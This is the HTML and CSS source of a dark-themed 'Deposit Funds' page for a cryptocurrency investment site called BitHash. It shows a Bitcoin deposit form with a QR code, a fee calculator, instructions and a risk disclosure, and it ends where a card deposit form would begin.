<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>BitHash | Deposit Funds</title>
    <meta name="description" content="Deposit funds to your BitHash account using Bitcoin or Credit Card.">
    
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Rowdies:wght@300;400;700&family=Inter:wght@300;400;500;600;700&family=Manrope:wght@500;600;700&display=swap" rel="stylesheet">
    
    <!-- Favicon -->
    <link rel="icon" href="https://www.dropbox.com/scl/fi/1dq16nex1borvvknpcwox/circular_dark_background.png?rlkey=sq2ujl2oxxk9vyvg1j7oz0cdb&raw=1" type="image/png">
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- AOS Animation -->
    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
    
    <!-- Google Places API -->
    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyB6Ty5ZHqoSA2jlyqnyi1c7HqLp6G8Ij7I&libraries=places"></script>
    
    <!-- QR Code Generator -->
    <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
    
    <style>
        :root {
            --primary: #00D395;
            --primary-dark: #00B783;
            --primary-light: #00E5A1;
            --secondary: #1E1E1E;
            --secondary-dark: #121212;
            --dark: #E5E5E5;
            --darker: #0A0A0A;
            --light: #121212;
            --lighter: #1E1E1E;
            --gray: #8E8E8E;
            --gray-light: #2E2E2E;
            --gray-lighter: #252525;
            --success: #00D395;
            --warning: #FFB800;
            --error: #FF3D57;
            --gold: #D4AF37;
            --gold-light: #FFD700;
            --gold-dark: #996515;
            --blue: #003366;
            --blue-dark: #002244;
            --blue-light: #004488;
            --purple: #784FED;
            --pink: #EC4899;
            --gradient: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
            --gold-gradient: linear-gradient(135deg, var(--gold) 0%, var(--gold-light) 100%);
            --blue-gradient: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
            --border-radius: 8px;
            --border-radius-lg: 12px;
            --box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            --box-shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.2), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            --transition-slow: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
            --visa-blue: #1A1F71;
            --visa-gold: #F7B600;
            --mastercard-red: #EB001B;
            --mastercard-yellow: #F79E1B;
            --security-blue: #1A73E8;
            --security-green: #34A853;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html {
            scroll-behavior: smooth;
            overflow-x: hidden;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            color: var(--dark);
            background-color: var(--light);
            line-height: 1.6;
            overflow-x: hidden;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }
        
        /* Bitcoin Logo Animation */
        @keyframes bitcoinFloat {
            0%, 100% {
                transform: translateY(0) rotate(0deg);
            }
            25% {
                transform: translateY(-20px) rotate(90deg);
            }
            50% {
                transform: translateY(0) rotate(180deg);
            }
            75% {
                transform: translateY(-10px) rotate(270deg);
            }
        }

        .bitcoin-animation {
            display: inline-block;
            animation: bitcoinFloat 4s ease-in-out infinite;
            margin-right: 5px;
            vertical-align: middle;
            color: var(--gold);
            text-shadow: 0 0 10px var(--gold-light);
            font-weight: bold;
            transform-origin: center;
        }

        .footer-bitcoin-animation {
            display: inline-block;
            animation: bitcoinFloat 4s ease-in-out infinite;
            margin-right: 5px;
            vertical-align: middle;
            color: var(--gold);
            text-shadow: 0 0 10px var(--gold-light);
            font-weight: bold;
            transform-origin: center;
        }

        /* Mining Animation */
        @keyframes miningPulse {
            0% { transform: scale(1); opacity: 0.8; }
            50% { transform: scale(1.05); opacity: 1; text-shadow: 0 0 10px var(--gold-light); }
            100% { transform: scale(1); opacity: 0.8; }
        }

        .mining-animation {
            display: inline-block;
            animation: miningPulse 2s ease-in-out infinite;
            color: var(--gold);
        }

        /* Security Badge */
        .security-badge {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: var(--darker);
            padding: 12px 16px;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow-lg);
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 0.85rem;
            font-weight: 600;
            z-index: 100;
            border-left: 4px solid var(--security-green);
            color: var(--dark);
            border: 1px solid var(--gray-light);
        }
        
        .security-badge i {
            color: var(--security-green);
            font-size: 1rem;
        }
        
        /* Loading Overlay */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: var(--darker);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            transition: opacity 0.5s ease, visibility 0.5s ease;
        }
        
        .loading-overlay.hidden {
            opacity: 0;
            visibility: hidden;
        }
        
        .loading-logo {
            width: 80px;
            height: 80px;
            animation: pulse 1.5s infinite ease-in-out;
            filter: drop-shadow(0 0 10px rgba(0, 211, 149, 0.3));
        }
        
        .loading-text {
            margin-top: 20px;
            font-weight: 500;
            color: var(--gray);
            font-size: 1rem;
        }
        
        @keyframes pulse {
            0% { transform: scale(0.95); opacity: 0.8; }
            50% { transform: scale(1.05); opacity: 1; }
            100% { transform: scale(0.95); opacity: 0.8; }
        }
        
        .container {
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 15px;
        }
        
        /* Enhanced Header Styles - Smaller and Neater */
        header {
            background-color: var(--darker);
            box-shadow: var(--box-shadow);
            position: fixed;
            width: 100%;
            top: 0;
            z-index: 1000;
            padding: 8px 0;
            transition: var(--transition-slow);
            border-bottom: 1px solid var(--gray-light);
            height: 60px;
        }
        
        header.scrolled {
            background-color: rgba(10, 10, 10, 0.98);
            backdrop-filter: blur(5px);
        }
        
        .header-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative;
            height: 100%;
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            z-index: 1001;
        }
        
        .logo img {
            height: 32px;
            width: auto;
            transition: var(--transition);
        }
        
        .logo:hover img {
            transform: scale(1.05);
        }
        
        .logo-text {
            font-family: 'Rowdies', sans-serif;
            font-weight: 700;
            font-size: 1.3rem;
            color: var(--primary);
            background-clip: text;
            position: relative;
        }
        
        /* Auth Buttons - More compact */
        .auth-buttons {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .auth-buttons .btn {
            padding: 6px 12px;
            font-size: 0.85rem;
        }
        
        .user-balance {
            background-color: var(--primary);
            color: var(--darker);
            padding: 6px 12px;
            border-radius: var(--border-radius);
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 0.85rem;
        }
        
        .user-balance:hover {
            background-color: var(--primary-light);
            transform: translateY(-2px);
        }
        
        .user-balance i {
            font-size: 0.85rem;
        }
        
        /* Mobile Menu Toggle */
        .mobile-menu-toggle {
            display: none;
            background: none;
            border: none;
            color: var(--dark);
            font-size: 1.3rem;
            cursor: pointer;
            padding: 5px;
            z-index: 1001;
            transition: var(--transition);
        }
        
        .mobile-menu-toggle:hover {
            color: var(--primary);
        }
        
        nav {
            transition: var(--transition-slow);
        }
        
        nav ul {
            display: flex;
            list-style: none;
            gap: 20px;
        }
        
        nav a {
            text-decoration: none;
            color: var(--dark);
            font-weight: 500;
            transition: var(--transition);
            position: relative;
            font-size: 0.9rem;
            padding: 3px 0;
        }
        
        nav a:hover {
            color: var(--primary);
        }
        
        nav a::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 0;
            height: 2px;
            background: var(--primary);
            transition: var(--transition);
        }
        
        nav a:hover::after {
            width: 100%;
        }
        
        .btn {
            padding: 10px 20px;
            border-radius: var(--border-radius);
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            border: none;
            font-size: 0.9rem;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            white-space: nowrap;
        }
        
        .btn-primary {
            background: var(--gradient);
            color: var(--darker);
            box-shadow: 0 4px 15px rgba(0, 211, 149, 0.3);
        }
        
        .btn-primary:hover {
            background: linear-gradient(135deg, var(--primary-light) 0%, var(--primary) 100%);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 211, 149, 0.4);
        }
        
        .btn-outline {
            background-color: transparent;
            color: var(--primary);
            border: 1px solid var(--primary);
        }
        
        .btn-outline:hover {
            background: var(--primary);
            color: var(--darker);
            transform: translateY(-2px);
        }
        
        .btn-gold {
            background: var(--gold-gradient);
            color: var(--darker);
            box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3);
        }
        
        .btn-gold:hover {
            background: linear-gradient(135deg, var(--gold-light) 0%, var(--gold) 100%);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(212, 175, 55, 0.4);
        }
        
        /* Dashboard Specific Styles */
        .dashboard-section {
            padding: 90px 0 30px;
            background-color: var(--light);
        }
        
        .dashboard-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            flex-wrap: wrap;
            gap: 15px;
        }
        
        .dashboard-title h1 {
            font-size: 1.8rem;
            color: var(--dark);
            margin-bottom: 5px;
        }
        
        .dashboard-title p {
            color: var(--gray);
            font-size: 0.9rem;
        }
        
        .dashboard-actions {
            display: flex;
            gap: 12px;
        }
        
        .dashboard-grid {
            display: grid;
            grid-template-columns: repeat(12, 1fr);
            gap: 15px;
            margin-bottom: 25px;
        }
        
        .balance-card {
            grid-column: span 4;
            background-color: var(--lighter);
            border-radius: var(--border-radius-lg);
            padding: 20px;
            box-shadow: var(--box-shadow);
            transition: var(--transition);
            border: 1px solid var(--gray-light);
        }
        
        .balance-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
        }
        
        .balance-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }
        
        .balance-title {
            font-size: 0.95rem;
            color: var(--gray);
        }
        
        .balance-icon {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.1rem;
        }
        
        .balance-icon.main {
            background-color: rgba(0, 211, 149, 0.1);
            color: var(--primary);
        }
        
        .balance-icon.active {
            background-color: rgba(26, 115, 232, 0.1);
            color: var(--security-blue);
        }
        
        .balance-icon.matured {
            background-color: rgba(212, 175, 55, 0.1);
            color: var(--gold);
        }
        
        .balance-amount {
            font-size: 1.8rem;
            font-weight: 700;
            color: var(--dark);
            margin-bottom: 5px;
            font-family: 'Manrope', sans-serif;
        }
        
        .btc-amount {
            font-size: 0.9rem;
            color: var(--gray);
            margin-bottom: 8px;
        }
        
        .balance-change {
            font-size: 0.85rem;
            color: var(--gray);
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .balance-change.positive {
            color: var(--primary);
        }
        
        .balance-change.negative {
            color: var(--error);
        }
        
        .dashboard-card {
            background-color: var(--lighter);
            border-radius: var(--border-radius-lg);
            padding: 20px;
            box-shadow: var(--box-shadow);
            transition: var(--transition);
            border: 1px solid var(--gray-light);
        }
        
        .dashboard-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
        }
        
        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .card-title {
            font-size: 1.1rem;
            color: var(--dark);
            font-weight: 600;
        }
        
        .card-actions {
            display: flex;
            gap: 8px;
        }
        
        .card-action-btn {
            background: none;
            border: none;
            color: var(--gray);
            cursor: pointer;
            transition: var(--transition);
            font-size: 0.85rem;
        }
        
        .card-action-btn:hover {
            color: var(--primary);
        }
        
        .deposit-card {
            grid-column: span 12;
        }
        
        .deposit-methods {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            border-bottom: 1px solid var(--gray-light);
            padding-bottom: 15px;
        }
        
        .method-tab {
            padding: 10px 20px;
            border-radius: var(--border-radius);
            cursor: pointer;
            transition: var(--transition);
            font-weight: 600;
            border: 1px solid transparent;
        }
        
        .method-tab.active {
            background-color: var(--primary);
            color: var(--darker);
        }
        
        .method-tab:not(.active):hover {
            border-color: var(--primary);
            color: var(--primary);
        }
        
        .deposit-form-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        
        .deposit-form {
            background-color: var(--light);
            padding: 20px;
            border-radius: var(--border-radius);
            border: 1px solid var(--gray-light);
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            font-size: 0.85rem;
            color: var(--gray);
            font-weight: 500;
        }
        
        .form-control {
            width: 100%;
            padding: 12px 15px;
            background-color: var(--lighter);
            border: 1px solid var(--gray-light);
            border-radius: var(--border-radius);
            color: var(--dark);
            font-size: 0.9rem;
            transition: var(--transition);
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(0, 211, 149, 0.1);
        }
        
        .form-control::placeholder {
            color: var(--gray);
            opacity: 0.7;
        }
        
        .card-input-container {
            position: relative;
        }
        
        .card-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 1.2rem;
            opacity: 0.7;
        }
        
        .card-icon.visa {
            color: var(--visa-blue);
        }
        
        .card-icon.mastercard {
            color: var(--mastercard-red);
        }
        
        .card-icon.amex {
            color: var(--blue);
        }
        
        .card-icon.discover {
            color: var(--purple);
        }
        
        .card-icon.generic {
            color: var(--gray);
        }
        
        .deposit-summary {
            background-color: var(--light);
            padding: 20px;
            border-radius: var(--border-radius);
            border: 1px solid var(--gray-light);
            height: 100%;
        }
        
        .summary-title {
            font-size: 1.1rem;
            color: var(--dark);
            margin-bottom: 15px;
            font-weight: 600;
        }
        
        .summary-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid var(--gray-light);
        }
        
        .summary-label {
            color: var(--gray);
            font-size: 0.85rem;
        }
        
        .summary-value {
            color: var(--dark);
            font-weight: 500;
        }
        
        .summary-total {
            font-weight: 700;
            color: var(--primary);
            font-size: 1.1rem;
            margin-top: 15px;
        }
        
        .btc-qr-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background-color: var(--light);
            border-radius: var(--border-radius);
            border: 1px solid var(--gray-light);
            margin-bottom: 20px;
        }
        
        .btc-qr-code {
            width: 200px;
            height: 200px;
            background-color: white;
            padding: 10px;
            margin-bottom: 15px;
        }
        
        .btc-address {
            background-color: var(--lighter);
            padding: 12px;
            border-radius: var(--border-radius);
            font-family: monospace;
            word-break: break-all;
            text-align: center;
            margin-bottom: 15px;
            position: relative;
        }
        
        .copy-address {
            position: absolute;
            right: 5px;
            top: 5px;
            background-color: var(--primary);
            color: var(--darker);
            border: none;
            border-radius: 4px;
            padding: 2px 5px;
            font-size: 0.7rem;
            cursor: pointer;
        }
        
        .deposit-disclaimer {
            background-color: rgba(255, 61, 87, 0.1);
            padding: 15px;
            border-radius: var(--border-radius);
            border-left: 4px solid var(--error);
            margin-top: 20px;
        }
        
        .disclaimer-title {
            color: var(--error);
            font-weight: 600;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .disclaimer-text {
            font-size: 0.8rem;
            color: var(--gray);
            line-height: 1.5;
        }
        
        .deposit-instructions {
            margin-top: 20px;
        }
        
        .instructions-title {
            font-size: 0.9rem;
            color: var(--dark);
            margin-bottom: 10px;
            font-weight: 600;
        }
        
        .instructions-list {
            padding-left: 20px;
            font-size: 0.8rem;
            color: var(--gray);
            line-height: 1.6;
        }
        
        .instructions-list li {
            margin-bottom: 8px;
        }
        
        /* Enhanced Notification System */
        .notification-center {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 9999;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            pointer-events: none;
            width: 100%;
            max-width: 90%;
        }
        
        .notification {
            width: 100%;
            max-width: 350px;
            padding: 16px 20px;
            border-radius: var(--border-radius-lg);
            box-shadow: var(--box-shadow-lg);
            display: flex;
            align-items: center;
            gap: 12px;
            transition: all 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
            transform: translateY(30px) scale(0.95);
            opacity: 0;
            margin-bottom: 10px;
            font-size: 0.85rem;
            font-weight: 500;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            pointer-events: auto;
            position: relative;
        }
        
        .notification.show {
            transform: translateY(0) scale(1);
            opacity: 1;
        }
        
        .notification.error {
            background-color: var(--error);
            color: white;
        }
        
        .notification.success {
            background-color: var(--success);
            color: white;
        }
        
        .notification.warning {
            background-color: var(--warning);
            color: var(--darker);
        }
        
        .notification.info {
            background-color: var(--blue);
            color: white;
        }
        
        .notification i {
            font-size: 1.2rem;
            flex-shrink: 0;
        }
        
        .notification-content {
            flex: 1;
            padding-right: 10px;
        }
        
        .notification-title {
            font-weight: 600;
            margin-bottom: 4px;
            font-size: 0.95rem;
        }
        
        .notification-message {
            font-size: 0.85rem;
            line-height: 1.4;
        }
        
        .notification-close {
            position: absolute;
            top: 8px;
            right: 8px;
            width: 20px;
            height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            background-color: rgba(0, 0, 0, 0.1);
            cursor: pointer;
            transition: var(--transition);
            font-size: 0.8rem;
        }
        
        .notification-close:hover {
            background-color: rgba(0, 0, 0, 0.2);
            transform: rotate(90deg);
        }
        
        @keyframes shake {
            10%, 90% { transform: translate3d(-1px, 0, 0); }
            20%, 80% { transform: translate3d(2px, 0, 0); }
            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
            40%, 60% { transform: translate3d(4px, 0, 0); }
        }
        
        .notification.error.show {
            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
        }
        
        /* Professional Disclaimer */
        .professional-disclaimer {
            background-color: rgba(0, 0, 0, 0.2);
            padding: 20px;
            border-radius: var(--border-radius-lg);
            border-left: 4px solid var(--gold);
            margin-top: 30px;
            position: relative;
            overflow: hidden;
        }
        
        .professional-disclaimer::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(212, 175, 55, 0.1) 0%, rgba(0, 0, 0, 0.3) 100%);
            z-index: -1;
        }
        
        .professional-disclaimer-title {
            color: var(--gold);
            font-weight: 700;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 1rem;
        }
        
        .professional-disclaimer-text {
            font-size: 0.8rem;
            color: var(--gray);
            line-height: 1.6;
            margin-bottom: 15px;
        }
        
        .professional-disclaimer-list {
            padding-left: 20px;
            font-size: 0.8rem;
            color: var(--gray);
            line-height: 1.6;
            margin-bottom: 15px;
        }
        
        .professional-disclaimer-list li {
            margin-bottom: 8px;
            position: relative;
        }
        
        .professional-disclaimer-list li::before {
            content: '•';
            color: var(--gold);
            font-weight: bold;
            display: inline-block;
            width: 1em;
            margin-left: -1em;
        }
        
        /* BTC Fee Calculator */
        .btc-fee-calculator {
            background-color: var(--lighter);
            padding: 15px;
            border-radius: var(--border-radius);
            margin-top: 20px;
            border: 1px solid var(--gray-light);
        }
        
        .btc-fee-title {
            font-size: 0.9rem;
            color: var(--dark);
            margin-bottom: 10px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .btc-fee-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            font-size: 0.85rem;
        }
        
        .btc-fee-label {
            color: var(--gray);
        }
        
        .btc-fee-value {
            color: var(--dark);
            font-weight: 500;
        }
        
        .btc-fee-total {
            margin-top: 10px;
            padding-top: 10px;
            border-top: 1px solid var(--gray-light);
            font-weight: 600;
            color: var(--primary);
        }
        
        /* Footer */
        footer {
            background-color: var(--darker);
            color: white;
            padding: 50px 0 20px;
        }
        
        .footer-container {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 30px;
            margin-bottom: 30px;
        }
        
        .footer-logo {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .footer-logo img {
            height: 28px;
            width: auto;
        }
        
        .footer-logo-text {
            font-family: 'Rowdies', sans-serif;
            font-weight: 700;
            font-size: 1.1rem;
            color: var(--primary);
        }
        
        .footer-about p {
            color: rgba(255, 255, 255, 0.7);
            font-size: 0.85rem;
            margin-bottom: 15px;
            line-height: 1.6;
        }
        
        .footer-social {
            display: flex;
            gap: 10px;
        }
        
        .social-icon {
            width: 34px;
            height: 34px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: var(--transition);
            color: white;
        }
        
        /* Social media icons */
        .social-icon.twitter {
            background-color: #1DA1F2;
        }
        
        .social-icon.linkedin {
            background-color: #0077B5;
        }
        
        .social-icon.facebook {
            background-color: #1877F2;
        }
        
        .social-icon.instagram {
            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D, #F56040, #F77737, #FCAF45, #FFDC80);
        }
        
        .social-icon:hover {
            transform: translateY(-3px) scale(1.05);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }
        
        .footer-title {
            font-weight: 700;
            margin-bottom: 15px;
            font-size: 1rem;
            color: white;
        }
        
        .footer-links ul {
            list-style: none;
        }
        
        .footer-links li {
            margin-bottom: 10px;
        }
        
        .footer-links a {
            color: rgba(255, 255, 255, 0.7);
            text-decoration: none;
            transition: var(--transition);
            font-size: 0.85rem;
            display: inline-block;
        }
        
        .footer-links a:hover {
            color: var(--primary);
            transform: translateX(3px);
        }
        
        .footer-contact p {
            display: flex;
            align-items: flex-start;
            gap: 10px;
            color: rgba(255, 255, 255, 0.7);
            margin-bottom: 12px;
            font-size: 0.85rem;
            line-height: 1.5;
        }
        
        .footer-contact i {
            color: var(--primary);
            width: 18px;
            text-align: center;
            margin-top: 2px;
        }
        
        .footer-bottom {
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            padding-top: 15px;
            text-align: center;
            color: rgba(255, 255, 255, 0.5);
            font-size: 0.75rem;
        }
        
        /* Responsive Styles */
        @media (max-width: 1200px) {
            .balance-card {
                grid-column: span 6;
            }
        }
        
        @media (max-width: 992px) {
            .deposit-form-container {
                grid-template-columns: 1fr;
            }
            
            .footer-container {
                grid-template-columns: repeat(2, 1fr);
                gap: 25px;
            }
        }
        
        @media (max-width: 768px) {
            .mobile-menu-toggle {
                display: block;
            }
            
            nav {
                position: fixed;
                top: 60px;
                left: 0;
                width: 100%;
                background-color: var(--darker);
                box-shadow: var(--box-shadow);
                padding: 15px;
                transform: translateY(-150%);
                opacity: 0;
                z-index: 999;
            }
            
            nav.active {
                transform: translateY(0);
                opacity: 1;
            }
            
            nav ul {
                flex-direction: column;
                gap: 12px;
                align-items: center;
            }
            
            .deposit-methods {
                flex-wrap: wrap;
            }
            
            .method-tab {
                flex: 1;
                text-align: center;
            }
            
            .footer-container {
                grid-template-columns: 1fr;
            }
        }
        
        @media (max-width: 576px) {
            .dashboard-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 12px;
            }
            
            .dashboard-title h1 {
                font-size: 1.5rem;
            }
            
            .dashboard-actions {
                width: 100%;
            }
            
            .dashboard-actions .btn {
                width: 100%;
            }
            
            .balance-card {
                grid-column: span 12;
            }
            
            .footer-container {
                gap: 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loading-overlay">
        <img src="https://www.dropbox.com/scl/fi/1dq16nex1borvvknpcwox/circular_dark_background.png?rlkey=sq2ujl2oxxk9vyvg1j7oz0cdb&raw=1" alt="BitHash Logo" class="loading-logo">    
        <div class="loading-text">Loading Deposit Information</div>
    </div>

    <!-- Security Badge -->
    <div class="security-badge">
        <i class="fas fa-shield-alt"></i>
        <span>256-bit AES & TLS 1.3 Encrypted</span>
    </div>

    <!-- Critical Error Notification System -->
    <div class="notification-center" id="notification-center">
        <!-- Notifications will be dynamically inserted here -->
    </div>

    <!-- Enhanced Header - Smaller and Neater -->
    <header id="main-header">
        <div class="container header-container">
            <div class="logo" onclick="window.location.href='index.html'">
                <img src="https://www.dropbox.com/scl/fi/1dq16nex1borvvknpcwox/circular_dark_background.png?rlkey=sq2ujl2oxxk9vyvg1j7oz0cdb&raw=1" alt="BitHash Logo">
                <span class="logo-text">
                    <span class="bitcoin-animation">₿</span>itHash
                </span>
            </div>
            
            <button class="mobile-menu-toggle" id="mobile-menu-toggle" aria-label="Toggle navigation">
                <i class="fas fa-bars"></i>
            </button>
            
            <nav id="main-nav">
                <ul>
                    <li><a href="index.html">Home</a></li>
                    <li><a href="index.html#plans">Investment Plans</a></li>
                    <li><a href="dashboard.html">Dashboard</a></li>
                    <li><a href="accountsetting.html">Settings</a></li>
                    <li><a href="index.html#contact">Contact</a></li>
                </ul>
            </nav>
            
            <div class="user-balance" id="user-balance" onclick="window.location.href='dashboard.html'">
                <i class="fas fa-wallet"></i>
                <span id="balance-amount">$0.00</span>
                <span id="balance-btc" style="display: none;"> | 0.000000 BTC</span>
            </div>
        </div>
    </header>

    <!-- Deposit Section -->
    <section class="dashboard-section">
        <div class="container">
            <div class="dashboard-header">
                <div class="dashboard-title">
                    <h1>Deposit Funds</h1>
                    <p>Add funds to your account using Bitcoin or Credit Card</p>
                </div>
                <div class="dashboard-actions">
                    <button class="btn btn-outline" onclick="window.location.href='dashboard.html'">
                        <i class="fas fa-arrow-left"></i> Back to Dashboard
                    </button>
                </div>
            </div>
            
            <!-- Deposit Methods Section -->
            <div class="dashboard-grid">
                <div class="dashboard-card deposit-card">
                    <div class="deposit-methods">
                        <div class="method-tab active" data-method="btc" onclick="switchDepositMethod('btc')">
                            <i class="fab fa-bitcoin"></i> Bitcoin (BTC)
                        </div>
                        <div class="method-tab" data-method="card" onclick="switchDepositMethod('card')">
                            <i class="far fa-credit-card"></i> Credit/Debit Card
                        </div>
                    </div>
                    
                    <div class="deposit-form-container">
                        <!-- Bitcoin Deposit Form -->
                        <div class="deposit-form" id="btc-deposit-form">
                            <div class="btc-qr-container">
                                <div id="btc-qr-code" class="btc-qr-code"></div>
                                <div class="btc-address" id="btc-address">
                                    Loading address...
                                    <button class="copy-address" onclick="copyBtcAddress()">
                                        <i class="fas fa-copy"></i>
                                    </button>
                                </div>
                            </div>
                            
                            <div class="form-group">
                                <label class="form-label">Deposit Amount (USD)</label>
                                <input type="number" id="btc-amount" class="form-control" placeholder="Enter amount in USD" min="10" step="1">
                            </div>
                            
                            <!-- BTC Fee Calculator -->
                            <div class="btc-fee-calculator" id="btc-fee-calculator">
                                <div class="btc-fee-title">
                                    <i class="fas fa-calculator"></i> Bitcoin Deposit Details
                                </div>
                                <div class="btc-fee-item">
                                    <span class="btc-fee-label">Amount to Deposit:</span>
                                    <span class="btc-fee-value" id="btc-deposit-amount">$0.00</span>
                                </div>
                                <div class="btc-fee-item">
                                    <span class="btc-fee-label">Processing Fee (1%):</span>
                                    <span class="btc-fee-value" id="btc-processing-fee">$0.00</span>
                                </div>
                                <div class="btc-fee-item">
                                    <span class="btc-fee-label">Network Fee:</span>
                                    <span class="btc-fee-value" id="btc-network-fee">$0.00</span>
                                </div>
                                <div class="btc-fee-item btc-fee-total">
                                    <span class="btc-fee-label">Total BTC to Send:</span>
                                    <span class="btc-fee-value" id="btc-total-amount">0.000000 BTC</span>
                                </div>
                            </div>
                            
                            <div class="deposit-disclaimer">
                                <div class="disclaimer-title">
                                    <i class="fas fa-exclamation-circle"></i>
                                    Important Notice
                                </div>
                                <div class="disclaimer-text">
                                    Bitcoin deposits may take 10-30 minutes to confirm depending on network conditions. 
                                    The amount credited will be based on the BTC/USD exchange rate at the time of confirmation. 
                                    Do not send any other cryptocurrencies to this address as they will be lost.
                                </div>
                            </div>
                            
                            <div class="deposit-instructions">
                                <div class="instructions-title">How to deposit Bitcoin:</div>
                                <ol class="instructions-list">
                                    <li>Send Bitcoin to the address displayed above</li>
                                    <li>Wait for network confirmations (typically 1-3 confirmations)</li>
                                    <li>Your account will be credited automatically</li>
                                    <li>You can track the transaction on any Bitcoin block explorer</li>
                                </ol>
                            </div>
                            
                            <!-- Professional Disclaimer -->
                            <div class="professional-disclaimer">
                                <div class="professional-disclaimer-title">
                                    <i class="fas fa-gavel"></i> Legal & Risk Disclosure
                                </div>
                                <div class="professional-disclaimer-text">
                                    Cryptocurrency investments involve substantial risk and are not suitable for all investors. 
                                    The value of Bitcoin and other cryptocurrencies can be extremely volatile and you could lose 
                                    your entire investment. Before making any deposit, please consider your investment objectives 
                                    and level of experience.
                                </div>
                                <ul class="professional-disclaimer-list">
                                    <li>BitHash is not a registered broker-dealer or investment adviser</li>
                                    <li>Past performance is not indicative of future results</li>
                                    <li>Crypto assets are not insured by any government agency</li>
                                    <li>You are solely responsible for your investment decisions</li>
                                </ul>
                                <div class="professional-disclaimer-text">
                                    By depositing funds, you acknowledge that you have read and understood these risks and 
                                    agree to our <a href="#" style="color: var(--gold);">Terms of Service</a> and 
                                    <a href="#" style="color: var(--gold);">Privacy Policy</a>.
                                </div>
                            </div>
                        </div>
                        
                        <!-- Card Deposit Form -->
